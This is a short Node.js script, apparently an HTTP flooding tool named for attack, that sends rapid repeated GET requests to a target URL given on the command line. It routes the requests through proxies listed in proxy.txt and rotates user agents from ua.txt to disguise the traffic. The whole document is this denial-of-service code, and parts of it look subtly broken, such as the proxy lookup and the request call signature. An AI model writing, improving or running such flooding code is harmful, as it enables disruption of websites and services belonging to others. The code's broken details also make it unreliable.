const request = require("request");
const process = require("process");
const shuffleArray = require("shuffle-array");

async function attackUsingProxy(proxy, duration, rate, numThreads) {
try {
const proxies = {
"http": `http://${proxy}`,
"https": `https://${proxy}`,
};

const userAgents = require("fs").readFileSync("ua.txt", "utf-8").split("\n");
shuffleArray(userAgents);

const startTime = Date.now();
let reqCount = 1;

while (Date.now() - startTime < duration * 1000) {
const selectedProxy = proxies[reqCount % numThreads];
const selectedUserAgent = userAgents[reqCount % userAgents.length];

console.log(`RUN PROXY: ${selectedProxy} - USER AGENT: ${selectedUserAgent}`);

for (let i = 0; i < rate; i++) {
const response = await request(
  "GET",
  targetUrl,
  {
    proxies: proxies,
    headers: {
      "User-Agent": selectedUserAgent,
    },
  },
);

if (response.statusCode !== 200) {
console.error(`Proxy ${proxy} failed: ${response.statusCode}`);
} else {
console.log(`RUN PROXY: ${selectedProxy} - USER AGENT: ${selectedUserAgent} - ${response.statusCode}`);
}
}

reqCount++;
}
} catch (e) {
console.error(`Proxy ${proxy} failed: ${e}`);
}
}

const [, , targetUrl, duration, rate, numThreads] = process.argv;

const proxies = require("fs").readFileSync("proxy.txt", "utf-8").split("\n");

for (let i = 0; i < numThreads; i++) {
attackUsingProxy(proxies[i], parseInt(duration), parseInt(rate), parseInt(numThreads));
}
